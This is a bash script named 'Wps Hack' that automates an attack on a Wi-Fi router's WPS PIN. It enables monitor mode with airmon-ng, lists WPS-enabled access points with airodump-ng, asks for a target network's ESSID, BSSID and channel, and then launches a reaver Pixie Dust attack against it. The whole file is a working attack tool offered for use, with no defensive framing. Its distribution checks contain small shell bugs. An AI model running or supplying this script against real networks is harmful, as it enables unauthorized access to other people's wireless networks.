#!/bin/bash

Color() {

res="\033[0m"
b='\033[0;30m'
r='\033[0;31m'
g='\033[0;32m'
y='\033[0;33m'
p='\033[0;34m'
c='\033[0;36m'
w='\033[0;37m'



}

Color

banner() {
clear
echo -e $p"------------------------------------------------------------------------"
echo -e $g "			::Wps Hack::"  
echo -e $p"------------------------------------------------------------------------"

}





clear
Drive="wlx983f9f25deec"

Distro=$(head -1 /etc/os-release | cut -f 2 -d '=' )
echo -e -n $r"["$y"~"$r"] "$res
echo -n -e $c"Checking Distro.... " $res
sleep 2
dis=$(python -c "import platform;print(platform.dist()[0])")
echo -e "[$g$dis$res]"
sleep 2
echo
if [ "$Distro"=="LinuxMint" ]; then
	check_drive=$(airmon-ng | grep $Drive )
	Stat=$?
	if [ $Stat -eq 0 ];
	then 
	int=$Drive
	mon="wlan0mon"

else
	int="wlo1"
	mon="wlo1mon"

fi
	airmon-ng | grep wlan0mon >/dev/null
	Mon_Stat=$?
	if [ $Mon_Stat -eq 0 ]; then
		mon="wlan0mon"
	

fi
if [ "$Distro"=="Kali" ] || [ "$Distro"=="Parrot"] ; then
	int="wlan0"
	mon="wlan0mon"

fi
fi



AP_Search() {

 
airmon-ng | grep mon >/dev/null
Status=$?
if [ $Status -eq 0 ]; then
	echo -e -n $r"["$y"~"$r"] "$res
	echo -e $y"Mointor Mode Is On"$res
	echo

else
echo -e -n $r"["$y"~"$r"] "$res
echo -e $r"Start Mointor Mode on $g $int ...." $res
echo
airmon-ng start $int >/dev/null 
fi

trap
sleep 3
echo
echo -e -n $r"["$y"~"$r"] "$res
echo -e $g"Press [Ctrl+C] To Stop"
sleep 2
airodump-ng $mon --wps
banner
echo "Insert The ESSID"
echo -e -n $r"["$y"~"$r"]: "$res
read ESSID
clear

echo "Insert The Network Bssid"
banner
echo -e -n $r"["$y"~"$r"]: "$res
read  bssid
clear

echo -n "Insert The Network Channel"
banner
echo -e -n $r"["$y"~"$r"]: "$res
read  Channel
echo


}


WpsHack() {


echo -e $c"----------------------------------------------------------------------------"$res
echo -e $c"Running Wps Attack On....$g$ESSID "$res$g"BSSID/"$r$bssid$res$g"  Channel/"$r$Channel$res
echo -e $c"----------------------------------------------------------------------------"$res

sleep 2


reaver -i $mon --bssid $bssid -c $Channel -vv -K 1 -f

}

AP_Search
WpsHack
